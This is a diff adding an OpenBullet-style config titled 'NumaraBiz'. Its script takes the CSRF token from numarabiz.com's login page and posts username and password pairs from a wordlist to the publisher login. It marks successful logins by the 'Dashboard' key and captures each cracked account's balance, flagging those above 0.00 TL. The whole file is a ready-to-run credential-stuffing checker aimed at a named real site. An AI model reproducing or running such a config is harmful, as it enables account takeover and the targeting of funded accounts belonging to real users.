@@ -1,0 +1,59 @@
+[SETTINGS]
+{
+  "Name": "NumaraBiz",
+  "SuggestedBots": 100,
+  "LastModified": "2019-05-30T15:10:16.1316645+03:00",
+  "AdditionalInfo": "",
+  "KeysDB": "",
+  "LocalKeysDB": "",
+  "Author": "3zm4N",
+  "Version": "1.2.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://numarabiz.com/giris" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+#Token PARSE "<SOURCE>" LR "<input type=\"hidden\" name=\"_token\" value=\"" "\"" -> VAR "Token" 
+#Login REQUEST POST "https://numarabiz.com/publisher/login" 
+  CONTENT "email=<USER>&password=<PASS>&_token=<Token>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://numarabiz.com" 
+  HEADER "referer: https://numarabiz.com/giris" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "Dashboard" 
+  KEYCHAIN Failure OR 
+    KEY "Bu kimlik bilgileri bizim kayıtlarımız ile eşleşmiyor." 
+REQUEST GET "https://numarabiz.com/publisher" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+KEYCHECK 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "0.00 TL" 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "0.00 TL" 
+PARSE "<SOURCE>" LR "<div class=\"huge ng-binding\">" "</div>" -> CAP "Bakiye:" 
